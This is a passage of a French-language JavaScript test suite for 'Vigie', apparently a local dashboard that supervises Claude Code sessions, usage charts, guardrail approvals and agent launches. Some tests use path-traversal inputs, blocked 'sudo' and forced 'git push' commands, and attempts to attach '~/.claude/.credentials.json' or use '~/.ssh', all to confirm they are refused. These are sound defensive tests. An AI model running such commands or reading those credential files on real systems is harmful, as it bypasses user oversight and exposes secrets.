  r = await post('/api/v2/settings', '[1,2]');
  assert.equal(r.status, 400);
  r = await post('/api/v2/settings', JSON.stringify({ x: 'a'.repeat(1_100_000) }));
  assert.equal(r.status, 413);
  assert.equal((await raw('PUT', '/api/v2/settings')).status, 405);
  assert.equal((await get('/api/v2/settings')).status, 405);
  assert.equal((await get('/api/v2/inconnu')).status, 404);
  assert.equal((await get('/public/../server.mjs')).status, 404);
  r = await get('/');
  assert.equal(r.status, 200);
  assert.match(r.text, /Ouvre l’app <strong>Vigie<\/strong>/);
  assert.match(r.text, /href="\/api\/v2\/overview"/);
  for (const x of [r, await get('/api/v2/overview')]) {
    assert.equal(x.headers['x-frame-options'], 'DENY');
    assert.match(x.headers['content-security-policy'], /frame-ancestors 'none'/);
    assert.equal(x.headers['access-control-allow-origin'], undefined);
  }
  assert.equal((await get('/api/v2/health')).status, 200, 'toujours en vie');
  assert.doesNotMatch(logs, /Error|erreur/i, 'aucune erreur dans le journal du serveur');
});

// ---------- fixtures de l'app ----------

test('fixtures de l\'app Mac conformes au contrat', () => {
  const dir = path.join(ROOT, 'mac', 'VigieApp', 'Fixtures');
  if (!fs.existsSync(dir)) return;
  const files = fs.readdirSync(dir).filter((f) => f.endsWith('.json'));
  assert.ok(files.includes('overview.json'));
  for (const f of files) {
    const j = rj(path.join(dir, f));
    const schema = f === 'overview.json' ? Overview : f === 'mcp.json' ? Mcp : f === 'accounts.json' ? Accounts : f.startsWith('conversation-') ? Detail : null;
    assert.ok(schema, `fixture inattendue : ${f}`);
    assert.deepEqual(check(j, schema), [], f);
  }
});

// ---------- tour 3 : consommation, graphique, garde-fous « seulement par Vigie » ----------
const Series = {
  from: ISO, to: ISO, stepMin: 'int', unit: oneOf('weekPct'),
  conversations: arr({ id: 'string', title: opt('string'), project: opt('string'), accountId: 'string', running: 'bool',
    points: arr({ t: ISO, weekPct: opt('number'), tokens: 'int' }) }),
  accounts: arr({ id: 'string', label: 'string', points: arr({ t: ISO, weekPct: opt('number'), tokens: 'int' }) }),
};
const total = (pts, k) => pts.reduce((x, p) => x + (p[k] || 0), 0);

test('historique : une ligne par issue, filtres par statut, conversation et texte ; période invalide refusée', async () => {
  const STATUSES = new Set(['accepted', 'refused', 'blocked', 'failed', 'question', 'vscode', 'waiting']);
  const all = (await get('/api/v2/history?window=1440')).body;
  assert.ok(all.items.length > 0);
  for (const it of all.items) {
    assert.ok(STATUSES.has(it.status), it.status);
    assert.ok(it.reason, `raison pour ${it.event}`);
    assert.ok(['claude', 'codex'].includes(it.app));
  }
  assert.deepEqual(all.items.map((x) => x.ts), [...all.items.map((x) => x.ts)].sort().reverse(), 'la plus récente d\'abord');
  assert.equal(Object.values(all.counts).reduce((a, b) => a + b, 0), all.items.length);
  assert.ok(!all.items.some((x) => x.event === 'garde-fou-attente' && x.status !== 'waiting'));
  noSecret({ text: JSON.stringify(all) });
  const status = Object.keys(all.counts)[0];
  const only = (await get(`/api/v2/history?window=1440&status=${status}`)).body;
  assert.ok(only.items.length > 0 && only.items.every((x) => x.status === status));
  assert.deepEqual(only.counts, all.counts, 'les compteurs restent ceux de toute la période');
  const one = all.items.find((x) => x.conversationId);
  const conv = (await get(`/api/v2/history?window=1440&conversation=${one.conversationId}`)).body;
  assert.ok(conv.items.every((x) => x.conversationId === one.conversationId));
  const word = one.title.split(' ')[0];
  assert.ok((await get(`/api/v2/history?window=1440&q=${encodeURIComponent(word)}`)).body.items.length > 0);
  assert.equal((await get('/api/v2/history?window=30')).status, 400);
});

test('passerelle MCP : relais et retour d\'autorisation branchés, sans en-tête X-Vigie ; état sans secret', async () => {
  let r = await raw('POST', '/mcp/inconnu', { body: '{}', headers: { 'Content-Type': 'application/json' } });
  assert.equal(r.status, 404);
  assert.match(r.body.error.message, /ne passe pas par Vigie/);
  r = await raw('GET', '/oauth/callback?state=inconnu&code=x');
  assert.equal(r.status, 400);
  assert.match(r.text, /Connexion non aboutie/);
  const inv = (await get('/api/v2/mcp')).body;
  assert.deepEqual(inv.gateway, {}, 'rien ne passe encore par Vigie');
  assert.equal((await post('/api/v2/gateway', { action: 'inconnue' })).status, 400);
  assert.equal((await post('/api/v2/gateway', { action: 'migrate', name: 'absent' })).status, 400);
});

test('consommation en direct et graphique sur 1 h / 10 h / 20 h (agents compris, en % de la semaine du compte)', async () => {
  const o = (await get('/api/v2/overview')).body;
  assert.deepEqual(check(o, Overview), []);
  const a = o.conversations.find((c) => c.id === SID_A);
  assert.equal(a.rate.spark.length, 30);
  assert.deepEqual([a.rate.weekPctPerHour, a.rate.tokensPerMin, a.rate.trend], [0, 0, 'flat'], 'rien depuis 30 min');
  assert.equal(a.alert, null);
  for (const [win, step] of [[60, 1], [600, 10], [1200, 20]]) {
    const r = await get(`/api/v2/usage/series?window=${win}`);
    assert.equal(r.status, 200);
    assert.deepEqual(check(r.body, Series), [], `window=${win}`);
    assert.equal(r.body.stepMin, step);
    for (const c of [...r.body.conversations, ...r.body.accounts]) assert.equal(c.points.length, 60);
    assert.ok(Date.parse(r.body.to) - Date.parse(r.body.from) >= (win - step) * 60_000);
  }
  const s60 = (await get('/api/v2/usage/series?window=60')).body;
  const pa = s60.conversations.find((c) => c.id === SID_A);
  assert.equal(pa.running, true);
  // La série commence à la minute pleine, une heure avant la requête : l'appel posé à -59 min (à l'heure du jeu
  // d'essai) en sort dès que la requête tombe dans une minute suivante. Mêmes proportions d'entrée et de sortie
  // partout : la part de la semaine suit les tokens.
  const from = Date.parse(s60.from);
  const lastHour = [-59, -56, -55, -50, -45].filter((m) => NOW + m * 60_000 >= from).length * 150 + 600;
  assert.equal(total(pa.points, 'tokens'), lastHour, 'tokens bruts de la dernière heure');
  assert.ok(Math.abs(total(pa.points, 'weekPct') - a.weekPct * lastHour / (5 * 150 + 600)) <= 0.06, 'même conversion que weekPct');
  assert.equal(total(s60.conversations.find((c) => c.id === SID_B).points, 'tokens'), 0, 'B a travaillé il y a 2 h');
  const s600 = (await get('/api/v2/usage/series?window=600')).body;
  assert.ok(total(s600.conversations.find((c) => c.id === SID_B).points, 'tokens') > 0);
  const acc = s600.accounts.find((x) => total(x.points, 'weekPct') > 0);
  assert.ok(acc && Math.abs(total(acc.points, 'weekPct') - 40) < 0.01, 'tout l\'usage de la semaine du compte tient dans ces 10 h : 40 %');
  for (const bad of ['30', 'abc', '60.5']) assert.equal((await get(`/api/v2/usage/series?window=${bad}`)).status, 400, bad);
});

test('garde-fous retenus dans Vigie : plus de réglage de mode, élément à autoriser, autoriser (message, lien) ou refuser', async () => {
  let r = await post('/api/v2/settings', { guard: { mode: 'vigie' } });
  assert.equal(r.status, 200, 'ancien réglage ignoré, sans erreur');
  assert.equal('mode' in r.body.settings.guard, false);
  assert.equal('mode' in rj(path.join(DATA, 'state.json')).guard, false);
  const A_ID = 'aaaaaaaaaaaaaaaa', B_ID = 'bbbbbbbbbbbbbbbb';
  const line = (id, action, extra = {}) => JSON.stringify({ ts: new Date().toISOString(), event: 'garde-fou-en-attente-vigie', sessionId: SID_A, cwd: CWD, tool: 'Bash',
    action, rule: 'Commande administrateur (sudo)', ruleId: 'sudo', approvalId: id, hash: id.repeat(4), pid: deadPid, ...extra });
  fs.appendFileSync(path.join(DATA, 'history.jsonl'), `${line(A_ID, 'sudo ls /var')}\n${line(B_ID, 'git push --force origin main',
    { rule: 'git push forcé ou suppression de branche distante', ruleId: 'force-push', agentId: 'agent-verif' })}\n`);
  const items = async () => (await get('/api/v2/overview')).body.toReview.filter((x) => x.id.startsWith('v:'));
  let v = [];
  for (let i = 0; i < 80 && v.length < 2; i++) { await new Promise((res) => setTimeout(res, 100)); v = await items(); }
  assert.equal(v.length, 2, 'les deux refus sont à autoriser');
  const o = (await get('/api/v2/overview')).body;
  assert.deepEqual(check(o, Overview), []);
  const va = v.find((x) => x.approvalId === A_ID);
  assert.deepEqual([va.kind, va.state, va.command, va.rule, va.conversationId, va.needsPassword, va.approved],
    ['blocked', 'awaiting', 'sudo ls /var', 'Commande administrateur (sudo)', SID_A, true, false]);
  assert.equal(v.find((x) => x.approvalId === B_ID).byAgent, 'agent-verif');
  assert.ok(o.conversations.find((c) => c.id === SID_A).needsYou >= 2);
  // erreurs
  assert.equal((await post('/api/v2/approvals', { approvalId: A_ID, decision: 'peut-être' })).status, 400);
  assert.equal((await post('/api/v2/approvals', {})).status, 400);
  assert.equal((await post('/api/v2/approvals', { approvalId: 'cccccccccccccccc' })).status, 404);
  assert.equal((await post('/api/v2/approvals', { approvalId: A_ID }, { 'Content-Type': 'application/json' })).status, 403, 'X-Vigie obligatoire');
  // autoriser : autorisation à usage unique, message à copier et lien qui ouvre la conversation avec le message
  r = await post('/api/v2/approvals', { approvalId: A_ID });
  assert.equal(r.status, 200);
  assert.equal(r.body.message, 'L\'utilisateur a autorisé : sudo ls /var. Relance-la exactement à l\'identique.');
  assert.equal(r.body.delivered, false);
  // jamais de lien vscode:// direct : il s'ouvrirait dans la fenêtre au premier plan, pas celle de la conversation
  assert.equal(r.body.openUrl, null);
  assert.equal(r.body.delivered, false, 'elle avait continué sans : message à coller');
  const ap = rj(path.join(DATA, 'approvals.json'))[A_ID];
  assert.deepEqual([ap.decision, ap.sessionId, ap.tool, ap.hash], ['allow', SID_A, 'Bash', A_ID.repeat(4)]);
  assert.ok(Math.abs(Date.parse(ap.expiresAt) - Date.now() - 2 * 3600_000) < 60_000);
  assert.equal((await items()).find((x) => x.approvalId === A_ID), undefined, 'autorisée : plus rien à décider, elle sort de la liste');
  // refuser : l'élément sort de la liste
  r = await post('/api/v2/approvals', { approvalId: B_ID, decision: 'deny' });
  assert.equal(r.body.ok, true);
  assert.deepEqual((await items()).map((x) => x.approvalId), [], 'A autorisée (sortie), B refusée (sortie)');
  // la relance consomme l'autorisation (ligne du hook) : l'élément sort aussi
  fs.appendFileSync(path.join(DATA, 'history.jsonl'), JSON.stringify({ ts: new Date().toISOString(), event: 'garde-fou-autorise-vigie', sessionId: SID_A,
    tool: 'Bash', action: 'sudo ls /var', approvalId: A_ID, hash: A_ID.repeat(4), pid: deadPid }) + '\n');
  await new Promise((res) => setTimeout(res, 4500)); // le serveur relit l'historique du hook toutes les 4 s
  assert.equal((await post('/api/v2/approvals', { approvalId: A_ID })).status, 404, 'déjà utilisée');
  assert.deepEqual(await items(), []);
});

// ---------- connexions vues par le coffre (lib/vault.mjs : data/connexions.json) ----------
test('connexions : compte du Mac refusé = « à reconnecter » ; connexion remise = un mot dans la vue d\'ensemble', async () => {
  const CX = path.join(DATA, 'connexions.json');
  const epoch = Math.floor(Date.now() / 1000);
  wj(CX, { v: 1, checkedAtEpoch: epoch, accounts: { travail1: { connected: false, state: 'dead', since: iso(-3) } } });
  let o = (await get('/api/v2/overview')).body;
  const item = o.toReview.find((x) => x.id === 'cx:travail1:dead');
  assert.ok(item, JSON.stringify(o.toReview.map((x) => x.id)));
  assert.match(item.title, /à reconnecter$/);
  assert.match(item.detail, /Anthropic a refusé sa connexion/);
  assert.match(item.detail, /VS Code affiche « déconnecté »/);
  assert.equal(item.kind, 'waiting');
  assert.equal(o.accounts.find((a) => a.id === 'travail1').connected, false);
  // remise en cours depuis peu : rien à montrer encore
  wj(CX, { v: 1, checkedAtEpoch: epoch, accounts: { travail1: { connected: false, state: 'restoring', since: new Date().toISOString() } } });
  o = (await get('/api/v2/overview')).body;
  assert.ok(!o.toReview.some((x) => x.id.startsWith('cx:')));
  wj(CX, { v: 1, checkedAtEpoch: epoch, accounts: { travail1: { connected: true, state: 'ok', restoredAt: new Date(Date.now() - 60_000).toISOString() } } });
  o = (await get('/api/v2/overview')).body;
  assert.ok(!o.toReview.some((x) => x.id.startsWith('cx:')));
  assert.ok(o.engine.notices.some((n) => /^Connexion de .+ remise par Vigie à \d\d:\d\d/.test(n)), JSON.stringify(o.engine.notices));
  assert.equal(o.accounts.find((a) => a.id === 'travail1').connected, true);
  fs.rmSync(CX);
});

// ---------- agents (lib/agents.mjs : data/agents/<id>/AGENT.md ; lib/opener.mjs) ----------
const SURFACE = oneOf('vscode', 'claude-app');
const AgentsList = {
  dir: 'string', account: opt({ id: 'string', label: 'string' }), surfaces: { available: arr(SURFACE), chosen: opt(SURFACE) },
  agents: arr({ id: 'string', name: 'string', description: opt('string'), icon: opt('string'), folder: 'string',
    fields: arr({ id: 'string', label: 'string', type: oneOf('text', 'longtext', 'url', 'urls'), required: 'bool', help: opt('string'), placeholder: opt('string') }),
    mcp: arr({ name: 'string', status: oneOf(...HEALTH_STATUSES) }), creates: arr('string'), error: opt('string') }),
};
const AgentFolder = {
  path: 'string', exists: 'bool', error: opt('string'),
  conversations: arr({ id: 'string', title: opt('string'), lastActivity: opt(ISO), running: 'bool', surface: oneOf('vscode', 'claude-app', 'terminal') }),
  sources: arr('string'),
};
const AgentLaunch = { ok: 'bool', folder: 'string', briefFile: 'string', prompt: 'string', surface: SURFACE, opened: oneOf('full', 'folder', 'no-prompt', 'none'),
  copied: arr('string'), message: 'string' };
test('agents : liste avec l\'état des MCP pour le compte des nouvelles conversations, lancement dans un dossier du dossier perso', async () => {
  const dir = path.join(DATA, 'agents');
  w(path.join(dir, 'demarrer-projet', 'AGENT.md'), `---
name: Démarrer un projet client
description: Brief et premier rendez-vous
icon: wand.and.stars
mcp: [figma-perso, inexistant, webflow-essai, notion-essai, Gmail]
creates:
  - Le dossier du projet et sa documentation
  - Le fichier Figma du projet
fields:
  - id: client
    label: Nom du client
    required: oui
  - id: questionnaire
    label: Questionnaire
    type: longtext
---
Prépare le projet de {{client}}.
`);
  w(path.join(dir, 'casse', 'AGENT.md'), '---\nname: "Cassé\n---\nx');
  // deux MCP de la passerelle : l'un ouvert (prêt), l'autre jamais autorisé
  const GW = path.join(DATA, 'gateway.json');
  const gw = (open) => ({ url: 'https://mcp.example.com/mcp', key: 'a'.repeat(48), profiles: [], active: null, addedAt: iso(-10), open });
  wj(GW, { servers: { 'webflow-essai': gw(true), 'notion-essai': gw(false) }, clients: {} });
  let r = await get('/api/v2/agents');
  assert.equal(r.status, 200, r.text);
  conforms(r.body, AgentsList);
  assert.equal(r.body.dir, dir);
  assert.deepEqual(r.body.surfaces, { available: ['vscode', 'claude-app'], chosen: 'vscode' }, 'VS Code avec son extension, et l\'app Claude');
  const accounts = (await get('/api/v2/accounts')).body;
  assert.equal(r.body.account.id, accounts.defaultForNew);
  assert.equal(r.body.account.label, accounts.accounts.find((a) => a.id === accounts.defaultForNew).label);
  assert.deepEqual(r.body.agents.map((a) => [a.id, a.error === null]), [['casse', false], ['demarrer-projet', true]]);
  const a = r.body.agents[1];
  assert.equal(a.folder, CODE, 'dossier proposé : ~/Code du dossier perso du moteur');
  assert.deepEqual(a.creates, ['Le dossier du projet et sa documentation', 'Le fichier Figma du projet']);
  assert.deepEqual(r.body.agents[0].creates, []);
  assert.deepEqual(a.fields.map((f) => [f.id, f.type, f.required]), [['client', 'text', true], ['questionnaire', 'longtext', false]]);
  assert.deepEqual(a.mcp[0], { name: 'figma-perso', status: 'connected' }, 'relevé de l\'essai « état réel des MCP »');
  assert.deepEqual(a.mcp.slice(1), [{ name: 'inexistant', status: 'unknown' }, { name: 'webflow-essai', status: 'connected' }, { name: 'notion-essai', status: 'needs-auth' },
    { name: 'Gmail', status: 'needs-auth' }], 'passerelle : prête si autorisée ; connecteur claude.ai sous son nom court');
  fs.rmSync(GW);
  assert.equal((await raw('GET', '/api/v2/agents', { token: null })).status, 401);

  const folder = path.join(CODE, 'cabinet-martin');
  const launch = (body, headers) => post('/api/v2/agents/launch', body, headers);
  assert.equal((await launch({ id: 'demarrer-projet', values: { client: 'Atelier' }, folder }, { 'Content-Type': 'application/json' })).status, 403, 'X-Vigie obligatoire');
  assert.equal((await raw('POST', '/api/v2/agents/launch', { body: { id: 'demarrer-projet', values: { client: 'Atelier' }, folder }, headers: { 'X-Vigie': '1' }, token: null })).status, 401);
  assert.equal(fs.existsSync(folder), false, 'rien de créé sans jeton ni en-tête');
  r = await launch({ id: 'demarrer-projet', values: { client: '' }, folder });
  assert.deepEqual([r.status, r.body], [400, { ok: false, error: 'Champ manquant : Nom du client' }]);
  r = await launch({ id: 'inconnu', values: {}, folder });
  assert.deepEqual([r.status, r.body], [404, { ok: false, error: 'Agent introuvable.' }]);
  r = await launch({ id: 'casse', values: {}, folder });
  assert.equal(r.status, 400);
  r = await launch({ id: 'demarrer-projet', values: { client: 'Atelier' }, folder: path.join(TMP, 'hors-maison') });
  assert.equal(r.status, 400);
  assert.match(r.body.error, /dossier perso/);
  r = await launch({ id: 'demarrer-projet', values: { client: 'Atelier' }, folder: path.join(HOME, '.claude', 'x') });
  assert.equal(r.status, 400);
  assert.equal((await raw('GET', '/api/v2/agents/launch')).status, 405);
  // surface inconnue, conversation à reprendre qui n'est pas dans ce dossier, fichier joint réservé : 400, rien de créé
  const values = { client: 'Cabinet Martin', questionnaire: 'Q : vos couleurs ?\nR : bleu' };
  r = await launch({ id: 'demarrer-projet', values, folder, surface: 'terminal' });
  assert.deepEqual([r.status, r.body.error], [400, 'Où ouvrir l\'agent ? « vscode » ou « claude-app ».']);
  const gone = 'Cette conversation n\'est plus dans ce dossier : relance en nouvelle conversation.';
  for (const session of [SID_B, '../..', 42]) {
    r = await launch({ id: 'demarrer-projet', values, folder, session });
    assert.deepEqual([r.status, r.body.error], [400, gone], String(session));
  }
  r = await launch({ id: 'demarrer-projet', values, folder, files: [path.join(CLAUDE, '.credentials.json')] });
  assert.deepEqual([r.status, r.body.error], [400, 'Fichier joint refusé : ~/.claude est réservé (réglages de Claude Code). Retire-le de la liste.']);
  // l'app Claude absente : refusée avant de rien créer
  fs.renameSync(path.join(APPS, 'Claude.app'), path.join(APPS, 'Claude.app.bak'));
  r = await launch({ id: 'demarrer-projet', values, folder, surface: 'claude-app' });
  assert.deepEqual([r.status, r.body.error], [400, 'L\'app Claude n\'est pas sur ton Mac : choisis VS Code, ou installe-la.']);
  assert.deepEqual((await get('/api/v2/agents')).body.surfaces, { available: ['vscode'], chosen: 'vscode' });
  fs.renameSync(path.join(APPS, 'Claude.app.bak'), path.join(APPS, 'Claude.app'));
  fs.renameSync(path.join(APPS, 'Visual Studio Code.app'), path.join(APPS, 'VS.bak'));
  r = await launch({ id: 'demarrer-projet', values, folder, surface: 'vscode' });
  assert.deepEqual([r.status, r.body.error], [400, 'VS Code et son extension Claude Code ne sont pas sur ton Mac : choisis l\'app Claude, ou installe-les.']);
  fs.renameSync(path.join(APPS, 'VS.bak'), path.join(APPS, 'Visual Studio Code.app'));
  assert.equal(fs.existsSync(folder), false, 'refusé : rien de créé');
  assert.ok(!macCalls().some((c) => c.args.some((x) => /cabinet-martin/.test(String(x)))), 'rien ouvert');

  // le dossier du formulaire, avant le lancement
  r = await get('/api/v2/agents/folder');
  assert.deepEqual([r.status, r.body.error], [400, 'Indique un dossier.']);
  assert.equal((await get('/api/v2/agents/folder?path=%20')).body.error, 'Indique un dossier.');
  r = await get(`/api/v2/agents/folder?path=${encodeURIComponent('~/Code/cabinet-martin')}`);
  conforms(r.body, AgentFolder);
  assert.deepEqual(r.body, { path: folder, exists: false, error: null, conversations: [], sources: [] });
  r = await get(`/api/v2/agents/folder?path=${encodeURIComponent('~/.ssh/client')}`);
  assert.deepEqual(r.body, { path: '~/.ssh/client', exists: false, error: 'Dossier refusé : ~/.ssh est réservé (tes clés). Choisis un dossier ailleurs, dans ~/Code par exemple.', conversations: [], sources: [] });
  assert.equal((await raw('GET', '/api/v2/agents/folder?path=~', { token: null })).status, 401);

  // lancement dans VS Code, nouvelle conversation, deux fichiers joints : la fenêtre du dossier « démarre », puis le lien
  const P = path.join(TMP, 'pièces');
  w(path.join(P, 'charte.pdf'), 'charte');
  w(path.join(P, 'brandbook', 'logo.svg'), '<svg/>');
  fs.rmSync(MAC_LOG, { force: true });
  w(VSCODE_STARTS, '');
  r = await launch({ id: 'demarrer-projet', values, folder, files: [path.join(P, 'charte.pdf'), path.join(P, 'brandbook')] });
  fs.rmSync(VSCODE_STARTS);
  assert.equal(r.status, 200, r.text);
  conforms(r.body, AgentLaunch);
  assert.deepEqual(Object.keys(r.body).sort(), ['briefFile', 'copied', 'folder', 'message', 'ok', 'opened', 'prompt', 'surface']);
  assert.deepEqual([r.body.folder, r.body.surface, r.body.opened, r.body.copied], [folder, 'vscode', 'full', ['sources/charte.pdf', 'sources/brandbook/']]);
  assert.equal(r.body.briefFile, path.join(folder, '.vigie', 'agent-demarrer-projet.md'));
  assert.equal(r.body.message, 'VS Code s\'ouvre sur le projet, avec le message prêt dans Claude Code : envoie-le.');
  assert.equal(r.body.prompt, `Lance l'agent « Démarrer un projet client » : lis le fichier ${r.body.briefFile} et suis ses consignes, dans le dossier ${folder}.`);
  assert.equal(fs.statSync(folder).mode & 0o777, 0o755, 'le moteur tourne en umask 077 : dossier remis lisible');
  assert.equal(fs.statSync(r.body.briefFile).mode & 0o777, 0o600);
  assert.equal(fs.readFileSync(path.join(folder, 'sources', 'brandbook', 'logo.svg'), 'utf8'), '<svg/>');
  const brief = fs.readFileSync(r.body.briefFile, 'utf8');
  assert.ok(brief.includes('Prépare le projet de Cabinet Martin.'));
  assert.ok(brief.includes('R : bleu'));
  assert.ok(brief.includes('Conversation : nouvelle\n'));
  assert.ok(brief.includes('### Fichiers joints\n\n- sources/charte.pdf\n- sources/brandbook/\n'));
  let calls = macCalls().map((c) => [c.bin, c.args]);
  assert.equal(calls.length, 2, JSON.stringify(calls));
  assert.deepEqual(calls[0], ['open', ['-a', 'Visual Studio Code', folder]]);
  const link = calls[1][1][0];
  assert.equal(calls[1][1].length, 1);
  assert.ok(link.startsWith('vscode://anthropic.claude-code/open?prompt='), link);
  assert.equal(new URLSearchParams(decodeURIComponent(link.slice(link.indexOf('?') + 1))).get('prompt'), r.body.prompt, 'le message survit aux deux décodages');
  assert.equal(rj(path.join(DATA, 'state.json')).agentsSurface, 'vscode', 'surface retenue');

  // la fenêtre ne répond jamais : le lien ne part pas, l'app copiera le message
  fs.rmSync(MAC_LOG, { force: true });
  fs.rmSync(IDE, { recursive: true, force: true });
  wj(path.join(IDE, `${IDE_PORTS[0]}.lock`), { pid: process.pid, workspaceFolders: [CWD], ideName: 'Visual Studio Code', transport: 'ws' }); // une autre fenêtre
  r = await launch({ id: 'demarrer-projet', values, folder: path.join(CODE, 'autre-projet') });
  assert.deepEqual([r.status, r.body.opened, r.body.message], [200, 'folder',
    'VS Code est ouvert sur le projet, mais le message n\'a pas pu partir dans Claude Code (si VS Code demande de faire confiance au dossier, accepte) : il est copié, colle-le dans Claude Code et envoie-le.']);
  assert.deepEqual(macCalls().map((c) => c.args), [['-a', 'Visual Studio Code', path.join(CODE, 'autre-projet')]], 'aucun lien vscode:// envoyé');

  // l'app Claude : nouvelle conversation, message prérempli ; surface retenue et proposée ensuite
  fs.rmSync(MAC_LOG, { force: true });
  r = await launch({ id: 'demarrer-projet', values, folder, surface: 'claude-app', files: [path.join(P, 'charte.pdf'), path.join(folder, 'sources', 'charte.pdf')] });
  assert.equal(r.status, 200, r.text);
  assert.deepEqual([r.body.surface, r.body.opened, r.body.copied], ['claude-app', 'full', ['sources/charte (2).pdf']], 'déjà dans sources : pas recopié');
  assert.equal(r.body.message, 'L\'app Claude s\'ouvre sur le projet, avec le message prêt : envoie-le.');
  calls = macCalls().map((c) => c.args);
  assert.equal(calls.length, 1);
  const u = new URL(calls[0][0]);
  assert.deepEqual([u.protocol, u.host, u.pathname, u.searchParams.get('folder'), u.searchParams.get('q'), u.searchParams.get('source')],
    ['claude:', 'code', '/new', folder, r.body.prompt, 'vigie']);
  assert.equal(rj(path.join(DATA, 'state.json')).agentsSurface, 'claude-app');
  assert.equal((await get('/api/v2/agents')).body.surfaces.chosen, 'claude-app');
  r = await get(`/api/v2/agents/folder?path=${encodeURIComponent(folder)}`);
  assert.deepEqual([r.body.exists, r.body.error, r.body.sources], [true, null, ['brandbook', 'charte (2).pdf', 'charte.pdf']]);
  fs.rmSync(dir, { recursive: true, force: true });
});

test('agents : conversations du dossier (triées, filtrées par dossier), reprise dans VS Code ou dans l\'app Claude', async () => {
  const dir = path.join(DATA, 'agents');
  w(path.join(dir, 'reprendre', 'AGENT.md'), '---\nname: Reprendre le projet\n---\nFais le point.');
  const F = path.join(CODE, 'cabinet-durand');
  fs.mkdirSync(path.join(F, 'docs'), { recursive: true });
  // trois conversations dans ce dossier (VS Code, app Claude ouverte, une lue pour l'usage seulement : plus de 48 h),
  // une dans un sous-dossier
  const [S1, S2, S3, S4] = ['5d1c7a8e-0f21-4d6b-9a3e-1b2c3d4e5f60', '6e2d8b9f-1a32-4e7c-8b4f-2c3d4e5f6a71', '7f3e9c0a-2b43-4f8d-9c5a-3d4e5f6a7b82', '8a4f0d1b-3c54-4a9e-8d6b-4e5f6a7b8c93'];
  const desk = (lines) => lines.flat().map((l) => ({ ...l, entrypoint: 'claude-desktop' }));
  const M1 = mk(S1, F), M2 = mk(S2, F), M3 = mk(S3, path.join(F, 'docs')), M4 = mk(S4, F);
  const at = (min) => new Date(Date.now() + min * 60_000).toISOString();
  writeLines(path.join(PROJECTS, '-maison-Code-cabinet-durand', `${S1}.jsonl`), [M1.human('prépare le brief', at(-50)), M1.say('Le brief est prêt.', at(-40))]);
  writeLines(path.join(PROJECTS, '-maison-Code-cabinet-durand', `${S2}.jsonl`), desk([M2.human('pose la charte', at(-20)), M2.say('C\'est fait.', at(-10))]));
  writeLines(path.join(PROJECTS, '-maison-Code-cabinet-durand-docs', `${S3}.jsonl`), [M3.human('relis', at(-5)), M3.say('Relu.', at(-4))]);
  const p4 = path.join(PROJECTS, '-maison-Code-cabinet-durand', `${S4}.jsonl`);
  writeLines(p4, [M4.human('premier essai', at(-3 * 24 * 60)), M4.say('Essayé.', at(-3 * 24 * 60 + 1))]);
  const old = new Date(Date.now() - 3 * 24 * 3600_000);
  fs.utimesSync(p4, old, old);
  // (son titre dans l'app Claude est écrit dès le départ, voir seed : l'app relit ses titres toutes les 30 s)
  assert.equal(S2, SID_APP);
  const sleeper = spawn(process.execPath, [FAKE_HOOK], { stdio: 'ignore' });
  const reg = path.join(SESSIONS, `${sleeper.pid}.json`);
  wj(reg, { pid: sleeper.pid, sessionId: S2, cwd: F, startedAt: Date.now() - 60_000, status: 'idle', entrypoint: 'claude-desktop', name: 'cabinet' });
  try {
    let r;
    for (let i = 0; i < 150; i++) {
      r = await get(`/api/v2/agents/folder?path=${encodeURIComponent(F)}`);
      if (r.body.conversations?.length === 3) break;
      await new Promise((res) => setTimeout(res, 100));
    }
    conforms(r.body, AgentFolder);
    assert.deepEqual(r.body.conversations.map((c) => [c.id, c.title, c.running, c.surface]), [
      [S2, 'Charte du cabinet', true, 'claude-app'],
      [S1, null, false, 'vscode'],
      [S4, null, false, 'vscode'],
    ], 'ce dossier seulement, la plus récente d\'abord ; titre de l\'app Claude');
    assert.ok(Date.parse(r.body.conversations[0].lastActivity) > Date.parse(r.body.conversations[1].lastActivity));
    // la même chose par un lien vers le dossier
    fs.symlinkSync(F, path.join(CODE, 'durand'));
    assert.deepEqual((await get(`/api/v2/agents/folder?path=${encodeURIComponent('~/Code/durand')}`)).body.conversations.map((c) => c.id), [S2, S1, S4]);
    // reprise dans l'app Claude d'une conversation née dans l'app : rouverte par son id local, sans message
    const launch = (body) => post('/api/v2/agents/launch', body);
    fs.rmSync(MAC_LOG, { force: true });
    r = await launch({ id: 'reprendre', values: {}, folder: F, surface: 'claude-app', session: S2 });
    assert.equal(r.status, 200, r.text);
    assert.equal(r.body.opened, 'no-prompt');
    assert.match(r.body.message, /^La conversation( « .+ »)? s'ouvre dans l'app Claude : le message est copié, colle-le \(⌘V\) et envoie-le\.$/);
    assert.equal(r.body.prompt, `Lance l'agent « Reprendre le projet » dans cette conversation : lis le fichier ${r.body.briefFile} et suis ses consignes. Tiens compte de ce qu'on a déjà fait ici.`);
    assert.ok(fs.readFileSync(r.body.briefFile, 'utf8').includes('Conversation : reprise (tu continues une conversation existante'));
    assert.deepEqual(macCalls().map((c) => c.args), [['claude://code/continue?session=local_9c1f']]);
    // née dans VS Code, reprise dans l'app : importée par son uuid
    fs.rmSync(MAC_LOG, { force: true });
    r = await launch({ id: 'reprendre', values: {}, folder: F, surface: 'claude-app', session: S1 });
    assert.deepEqual(macCalls().map((c) => c.args), [[`claude://resume?session=${S1}`]]);
    // reprise dans VS Code : la fenêtre du dossier existe déjà, le lien porte la conversation et le message
    fs.rmSync(MAC_LOG, { force: true });
    wj(path.join(IDE, `${IDE_PORTS[1]}.lock`), { pid: process.pid, workspaceFolders: [F], ideName: 'Visual Studio Code', transport: 'ws' });
    r = await launch({ id: 'reprendre', values: {}, folder: F, surface: 'vscode', session: S4 });
    assert.deepEqual([r.status, r.body.opened], [200, 'full'], r.text);
    const calls = macCalls().map((c) => c.args);
    assert.deepEqual(calls[0], ['-a', 'Visual Studio Code', F]);
    const q = new URLSearchParams(decodeURIComponent(calls[1][0].slice(calls[1][0].indexOf('?') + 1)));
    assert.deepEqual([q.get('session'), q.get('prompt')], [S4, r.body.prompt]);
    // une conversation d'un sous-dossier n'est pas « dans ce dossier »
    r = await launch({ id: 'reprendre', values: {}, folder: F, session: S3 });
    assert.deepEqual([r.status, r.body.error], [400, 'Cette conversation n\'est plus dans ce dossier : relance en nouvelle conversation.']);
  } finally {
    fs.rmSync(reg, { force: true });
    sleeper.kill('SIGKILL');
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

// ---------- bibliothèques d'agents (lib/libraries.mjs : dépôt git partagé, un dossier par agent) ----------
const Library = { id: 'string', name: 'string', url: 'string', addedAt: opt(ISO), updatedAt: opt(ISO), commit: opt('string'),
